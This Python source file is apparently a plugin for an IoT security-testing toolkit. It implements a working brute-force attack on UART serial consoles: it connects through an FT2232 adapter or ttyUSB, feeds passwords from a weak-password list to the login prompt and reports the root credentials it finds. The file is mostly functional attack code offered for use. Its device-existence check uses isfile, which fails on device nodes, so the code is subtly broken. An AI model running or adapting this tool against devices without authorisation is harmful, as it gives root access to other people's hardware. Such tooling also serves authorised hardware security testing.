#!/usr/bin/python3

import pluggy
from typing import Optional, Any
import serial
import sys
import time
from sat_toolkit.core.exploit_spec import ExploitResult
from sat_toolkit.models.Target_Model import TargetManager
from sat_toolkit.tools.input_mgr import Input_Mgr
from sat_toolkit.core.base_plugin import BasePlugin
from sat_toolkit.tools.apt_mgr import AptMgr
from sat_toolkit.core.device_manager import DeviceDriverManager
from sat_toolkit.tools.xlogger import xlog

logger = xlog.get_logger(__name__)
hookimpl = pluggy.HookimplMarker("exploit_mgr")

class UARTBruteAttackPlugin(BasePlugin):
    def __init__(self):
        super().__init__({
            'Name': 'UART Brute Force Attack',
            'Description': 'Performs a brute-force attack on UART/serial connections.',
            'License': 'GPL',
            'Author': ['iotsploit'],
            'RequiresRoot': False,
            'Parameters': {
                'device_driver': {
                    'type': 'str',
                    'required': False,
                    'description': 'Device driver to use (e.g. drv_ft2232)',
                    'default': 'drv_ft2232'
                },
                'device_id': {
                    'type': 'str',
                    'required': False,
                    'description': 'Device ID to use (will be auto-detected if not provided)',
                    'default': ''
                },
                'channel': {
                    'type': 'str',
                    'required': False,
                    'description': 'UART channel to use (A or B for FT2232)',
                    'default': 'A'
                },
                'device_path': {
                    'type': 'str',
                    'required': False,
                    'description': 'Manual serial device path (only used if device_driver is not specified)',
                    'default': '/dev/ttyUSB0'
                },
                'baudrate': {
                    'type': 'int',
                    'required': True,
                    'description': 'Baud rate for serial connection',
                    'default': 115200
                },
                'username': {
                    'type': 'str',
                    'required': True,
                    'description': 'Username for login',
                    'default': 'root'
                },
                'password_list': {
                    'type': 'str',
                    'required': True,
                    'description': 'Path to the password list file',
                    'default': 'plugins/exploits/uart_brute/weak_pass.txt'
                },
                'timeout': {
                    'type': 'int',
                    'required': False,
                    'description': 'Timeout value for serial connection',
                    'default': 1
                },
                'username_prompt': {
                    'type': 'str',
                    'required': False,
                    'description': 'String that defines the username logon prompt',
                    'default': 'Login:'
                },
                'password_prompt': {
                    'type': 'str',
                    'required': False,
                    'description': 'String that defines the login password prompt',
                    'default': 'Password:'
                },
                'success_string': {
                    'type': 'str',
                    'required': False,
                    'description': 'String that defines a successful login',
                    'default': 'root@'
                },
                'connection_mode': {
                    'type': 'str',
                    'required': False,
                    'description': 'Connection mode: auto (try pyftdi first, then ttyUSB), pyftdi (use direct FTDI access), or ttyUSB (use kernel driver)',
                    'default': 'auto'
                }
            }
        })
        self.device_manager = DeviceDriverManager()

    @hookimpl
    def initialize(self, device_plugin: Optional[Any] = None):
        logger.debug("Initializing UARTBruteAttackPlugin")
        # Check for necessary packages (pyserial)
        try:
            import serial
            logger.debug("PySerial is installed")
        except ImportError:
            logger.error("PySerial is not installed. Installing...")
            if not AptMgr.install_package("python3-serial"):
                logger.error("Failed to install PySerial. Please install it manually with 'pip install pyserial'.")
                return

        # Try to import pyftdi for direct FTDI access
        try:
            import pyftdi.serialext
            logger.debug("PyFTDI is installed")
        except ImportError:
            logger.warning("PyFTDI is not installed. Only ttyUSB mode will be available.")

    def _get_available_devices(self, driver_name="drv_ft2232"):
        """Get available devices from the device manager"""
        try:
            # Scan for devices
            result = self.device_manager.scan_devices(driver_name)
            if result.get("status") != "success":
                logger.error(f"Failed to scan devices: {result.get('message', 'Unknown error')}")
                return []
            
            return result.get("devices", [])
        except Exception as e:
            logger.error(f"Error getting available devices: {str(e)}")
            return []

    def _select_device_interactive(self, devices):
        """Let the user select a device interactively"""
        if not devices:
            logger.warning("No devices found")
            return None
        
        print("Available devices:")
        for i, device in enumerate(devices):
            device_info = f"{i+1}. {device.name} - {device.device_id}"
            if 'channel_A' in device.attributes and device.attributes['channel_A']:
                device_info += f" (Channel A: {device.attributes['channel_A']})"
            if 'channel_B' in device.attributes and device.attributes['channel_B']:
                device_info += f" (Channel B: {device.attributes['channel_B']})"
            if 'serial_number' in device.attributes:
                device_info += f" (S/N: {device.attributes['serial_number']})"
            print(device_info)
        
        choice = Input_Mgr.Instance().int_input("\nSelect a device (number):")
        if choice < 1 or choice > len(devices):
            logger.error(f"Invalid choice: {choice}")
            return None
        
        return devices[choice - 1]

    def _select_channel_interactive(self, device):
        """Let the user select a channel interactively"""
        if 'channel_A' not in device.attributes or 'channel_B' not in device.attributes:
            return 'A'  # Default to A if channel info not available
        
        print(f"\nAvailable channels for {device.name}:")
        print(f"A: {device.attributes.get('channel_A', 'Not available')}")
        print(f"B: {device.attributes.get('channel_B', 'Not available')}")
        
        channel = Input_Mgr.Instance().string_input("\nSelect a channel (A/B):").upper()
        if channel not in ['A', 'B']:
            logger.warning(f"Invalid channel: {channel}, defaulting to A")
            return 'A'
        
        return channel

    def _check_tty_device_exists(self, path):
        """Check if a TTY device exists"""
        try:
            import os
            return os.path.exists(path) and os.path.isfile(path)
        except Exception as e:
            logger.error(f"Error checking device path: {str(e)}")
            return False

    def _connect_with_pyftdi(self, serial_number, channel, baudrate, timeout):
        """Connect to a device using PyFTDI direct access"""
        try:
            from pyftdi.serialext import serial_for_url
            channel_index = '1' if channel == 'A' else '2'
            url = f'ftdi://ftdi:2232h:{serial_number}/{channel_index}'
            logger.info(f"Connecting with PyFTDI, URL: {url}")
            ser = serial_for_url(url, baudrate=baudrate, timeout=timeout)
            return ser, True
        except ImportError:
            logger.error("PyFTDI is not installed")
            return None, False
        except Exception as e:
            logger.error(f"Error connecting with PyFTDI: {str(e)}")
            return None, False

    def _connect_with_ttyusb(self, device_path, baudrate, timeout):
        """Connect to a device using ttyUSB"""
        try:
            if not self._check_tty_device_exists(device_path):
                logger.warning(f"TTY device {device_path} does not exist")
                return None, False
                
            logger.info(f"Connecting with ttyUSB, device: {device_path}")
            ser = serial.Serial(device_path, baudrate=baudrate, timeout=timeout)
            return ser, True
        except Exception as e:
            logger.error(f"Error connecting with ttyUSB: {str(e)}")
            return None, False

    def _try_reset_device(self, serial_number):
        """Try to reset the device through device manager"""
        try:
            if serial_number:
                # Find the device
                devices = self._get_available_devices("drv_ft2232")
                device = next((d for d in devices if d.device_id == f"ft2232_{serial_number}"), None)
                
                if device:
                    # Close the device
                    logger.info(f"Attempting to reset device with serial number: {serial_number}")
                    result = self.device_manager.close_device("drv_ft2232", device)
                    if result.get("status") == "success":
                        logger.info("Successfully reset device through device manager")
                        return True
            
            return False
        except Exception as e:
            logger.error(f"Error resetting device: {str(e)}")
            return False

    @hookimpl
    def execute(self, target: Optional[Any] = None, parameters: Optional[dict] = None) -> ExploitResult:
        logger.info("Executing UARTBruteAttackPlugin")
        try:
            # Execute the attack
            result = self._execute_attack(target, parameters)
            return result
            
        except Exception as e:
            logger.error(f"Error during UART Brute attack: {str(e)}")
            return ExploitResult(False, f"UART Brute attack failed: {str(e)}", {})

    def _execute_attack(self, target, parameters):
        """Helper method to execute the actual attack"""
        logger.info(f"Executing UARTBruteAttackPlugin with parameters: {parameters}")
        
        # Connection variables
        serial_device = None
        selected_device = None
        selected_channel = None
        serial_number = None
        connection_mode = "auto"  # Default to auto mode
        serial_conn = None
        connection_info = {}
        
        if parameters:
            device_driver = parameters.get('device_driver')
            device_id = parameters.get('device_id', '')
            channel = parameters.get('channel', 'A')
            device_path = parameters.get('device_path', '/dev/ttyUSB0')
            baudrate = parameters.get('baudrate', 115200)
            username = parameters.get('username', 'root')
            password_list = parameters.get('password_list', 'plugins/exploits/uart_brute/weak_pass.txt')
            timeout = parameters.get('timeout', 1)
            username_prompt = parameters.get('username_prompt', 'Login:')
            password_prompt = parameters.get('password_prompt', 'Password:')
            success_string = parameters.get('success_string', 'root@')
            connection_mode = parameters.get('connection_mode', 'auto')
            
            # Process device selection
            if device_driver:
                devices = self._get_available_devices(device_driver)
                
                if not devices:
                    logger.warning(f"No {device_driver} devices found, falling back to manual device path")
                    serial_device = device_path
                else:
                    # If device_id specified, find that device
                    if device_id:
                        for device in devices:
                            if device.device_id == device_id:
                                selected_device = device
                                break
                        
                        if not selected_device:
                            logger.warning(f"Device with ID {device_id} not found, using first available device")
                            selected_device = devices[0]
                    else:
                        # Just use the first device
                        selected_device = devices[0]
                    
                    # Determine serial number and channel
                    if selected_device:
                        selected_channel = channel
                        if 'serial_number' in selected_device.attributes:
                            serial_number = selected_device.attributes['serial_number']
                        
                        # Try to get TTY device path for the channel
                        channel_attr = f'channel_{selected_channel}'
                        if channel_attr in selected_device.attributes and selected_device.attributes[channel_attr]:
                            serial_device = selected_device.attributes[channel_attr]
            else:
                # Manual device path specified
                serial_device = device_path
                connection_mode = "ttyUSB"  # Force ttyUSB mode when manual path specified
        else:
            # Interactive mode - get parameters from user
            logger.info("Entering interactive mode")
            
            # Ask if user wants to select connection mode
            connection_mode_choices = ["auto", "pyftdi", "ttyUSB"]
            connection_mode = Input_Mgr.Instance().single_choice(
                "Select connection mode",
                connection_mode_choices
            )
            
            # Ask if user wants to use device manager
            use_manager = Input_Mgr.Instance().yes_no_input("Do you want to use device manager to detect UART devices? (y/n):")
            
            if use_manager:
                # Get available driver options
                available_drivers = self.device_manager.list_drivers()
                ft2232_driver = next((d for d in available_drivers if d == 'drv_ft2232'), None)
                
                if not ft2232_driver:
                    logger.warning("FT2232 driver not found, falling back to manual input")
                    use_device_manager = False
                else:
                    # Get available devices from the ft2232 driver
                    devices = self._get_available_devices(ft2232_driver)
                    
                    if not devices:
                        logger.warning("No FT2232 devices found, falling back to manual input")
                        use_device_manager = False
                    else:
                        # Let user select a device
                        selected_device = self._select_device_interactive(devices)
                        
                        if not selected_device:
                            logger.warning("No device selected, falling back to manual input")
                            use_device_manager = False
                        else:
                            # Let user select a channel
                            selected_channel = self._select_channel_interactive(selected_device)
                            
                            # Determine serial number for direct connection
                            if 'serial_number' in selected_device.attributes:
                                serial_number = selected_device.attributes['serial_number']
                            
                            # Get the serial port for the selected channel
                            channel_attr = f'channel_{selected_channel}'
                            
                            if channel_attr in selected_device.attributes and selected_device.attributes[channel_attr]:
                                serial_device = selected_device.attributes[channel_attr]
                                logger.info(f"Using serial device: {serial_device}")
            
            # If manual selection needed
            if not serial_device and (connection_mode == "ttyUSB" or connection_mode == "auto"):
                serial_device = Input_Mgr.Instance().string_input("Enter the serial device path (default: /dev/ttyUSB0):")
                if not serial_device:
                    serial_device = '/dev/ttyUSB0'
            
            # Get the rest of the parameters
            baudrate = Input_Mgr.Instance().int_input("Enter the baud rate (default: 115200):")
            if baudrate == 0:  # Assuming 0 is returned for empty input
                baudrate = 115200
                
            username = Input_Mgr.Instance().string_input("Enter the username (default: root):")
            if not username:
                username = 'root'
                
            password_list = Input_Mgr.Instance().string_input("Enter the path to the password list file (default: plugins/exploits/uart_brute/weak_pass.txt):")
            if not password_list:
                password_list = 'plugins/exploits/uart_brute/weak_pass.txt'
                
            timeout = Input_Mgr.Instance().int_input("Enter the timeout value (default: 1):")
            if timeout == 0:  # Assuming 0 is returned for empty input
                timeout = 1
                
            username_prompt = Input_Mgr.Instance().string_input("Enter the username prompt (default: Login:):")
            if not username_prompt:
                username_prompt = 'Login:'
                
            password_prompt = Input_Mgr.Instance().string_input("Enter the password prompt (default: Password:):")
            if not password_prompt:
                password_prompt = 'Password:'
                
            success_string = Input_Mgr.Instance().string_input("Enter the success string (default: root@):")
            if not success_string:
                success_string = 'root@'

        # Try to open the password file
        try:
            with open(password_list, "r") as file:
                passwords = file.readlines()
            logger.info(f"Loaded {len(passwords)} passwords from {password_list}")
        except Exception as e:
            logger.error(f"Failed to open password file: {str(e)}")
            return ExploitResult(False, f"Failed to open password file: {str(e)}", {})

        # Prepare context for result
        context = {
            "device_info": {
                "baudrate": baudrate,
                "connection_mode": connection_mode
            }
        }
        
        if serial_device:
            context["device_info"]["path"] = serial_device
            
        if selected_device:
            context["device_info"]["name"] = selected_device.name
            context["device_info"]["id"] = selected_device.device_id
            context["device_info"]["channel"] = selected_channel
            if serial_number:
                context["device_info"]["serial_number"] = serial_number

        # Connect to the device based on connection mode
        tty_connected = False
        pyftdi_connected = False
        
        # First try to connect with the preferred method
        if connection_mode == "pyftdi" or connection_mode == "auto":
            if serial_number:
                logger.info(f"Attempting PyFTDI connection with serial number: {serial_number}")
                serial_conn, pyftdi_connected = self._connect_with_pyftdi(
                    serial_number, 
                    selected_channel or 'A', 
                    int(baudrate), 
                    int(timeout)
                )
                
                if pyftdi_connected:
                    logger.info("PyFTDI connection successful")
                    connection_info["mode"] = "pyftdi"
                    connection_info["url"] = f'ftdi://ftdi:2232h:{serial_number}/{1 if selected_channel == "A" else 2}'
        
        # If pyftdi failed or not requested, try ttyUSB
        if (not pyftdi_connected) and (connection_mode == "ttyUSB" or connection_mode == "auto"):
            if serial_device:
                logger.info(f"Attempting ttyUSB connection with device: {serial_device}")
                serial_conn, tty_connected = self._connect_with_ttyusb(
                    serial_device, 
                    int(baudrate), 
                    int(timeout)
                )
                
                if tty_connected:
                    logger.info("ttyUSB connection successful")
                    connection_info["mode"] = "ttyUSB"
                    connection_info["device"] = serial_device
        
        # If both methods failed and we have a serial number, try reset and then ttyUSB
        if not pyftdi_connected and not tty_connected and serial_number and connection_mode == "auto":
            logger.warning("Both connection methods failed, trying to reset the device")
            
            # Try to reset the device
            if self._try_reset_device(serial_number):
                # Wait for ttyUSB to reappear
                logger.info("Waiting for ttyUSB devices to reappear...")
                time.sleep(2)
                
                # Try ttyUSB again
                if serial_device:
                    logger.info(f"Attempting ttyUSB connection again with device: {serial_device}")
                    serial_conn, tty_connected = self._connect_with_ttyusb(
                        serial_device, 
                        int(baudrate), 
                        int(timeout)
                    )
                    
                    if tty_connected:
                        logger.info("ttyUSB connection successful after device reset")
                        connection_info["mode"] = "ttyUSB"
                        connection_info["device"] = serial_device
        
        # If we couldn't connect with any method
        if not serial_conn:
            error_msg = "Failed to connect to device with any method."
            if connection_mode == "pyftdi":
                error_msg += " pyftdi connection failed, try using ttyUSB mode."
            elif connection_mode == "ttyUSB":
                error_msg += " ttyUSB connection failed, check if device exists."
            logger.error(error_msg)
            return ExploitResult(False, error_msg, context)

        # Add connection info to context
        context["connection_info"] = connection_info

        # Start the brute force attack
        logger.info(f"Starting brute force attack with username: {username}")
        
        try:
            # Send initial newline to trigger a prompt
            serial_conn.write(b"\n")
            
            # Main loop for password trying
            for password in passwords:
                password = password.strip()  # Remove newlines and spaces
                if not password:  # Skip empty passwords
                    continue
                    
                logger.debug(f"Trying password: {password}")
                
                # Read until we get a username or password prompt
                max_reads = 10  # Maximum read attempts before moving on
                read_count = 0
                
                while read_count < max_reads:
                    reading = serial_conn.readline().decode('utf-8', errors='ignore').strip()
                    read_count += 1
                    
                    if not reading:  # If nothing was read, try a few more times
                        time.sleep(0.1)
                        continue
                        
                    logger.debug(f"Read from serial: {reading}")
                    
                    # Check if successful login
                    if success_string in reading:
                        found_password = password
                        logger.info(f"Success! Username: {username}, Password: {password}")
                        # Send exit command to clean up
                        serial_conn.write(b"exit\n")
                        serial_conn.close()
                        
                        # Add success info to context
                        context["username"] = username
                        context["password"] = password
                        
                        return ExploitResult(True, f"UART Brute force attack successful! Username: {username}, Password: {password}", context)
                    
                    # If username prompt, send username
                    if username_prompt in reading:
                        logger.debug(f"Sending username: {username}")
                        serial_conn.write(f"{username}\n".encode())
                        break
                        
                    # If password prompt, send password
                    elif password_prompt in reading:
                        logger.debug(f"Sending password: {password}")
                        serial_conn.write(f"{password}\n".encode())
                        break
                
                # If we didn't find a prompt after max_reads, send a newline to try to trigger a prompt
                if read_count >= max_reads:
                    logger.debug("No prompt detected, sending newline")
                    serial_conn.write(b"\n")
                
                # Small delay between attempts
                time.sleep(0.5)
            
            # If we've tried all passwords and none worked
            serial_conn.close()
            context["tried_passwords"] = len(passwords)
            return ExploitResult(False, "UART Brute force attack failed: No valid password found", context)
                                
        except Exception as e:
            logger.error(f"Error during brute force attack: {str(e)}")
            try:
                serial_conn.close()
            except:
                pass
            return ExploitResult(False, f"Error during brute force attack: {str(e)}", context)

    @hookimpl
    def cleanup(self):
        logger.info("Cleaning up UARTBruteAttackPlugin")
        pass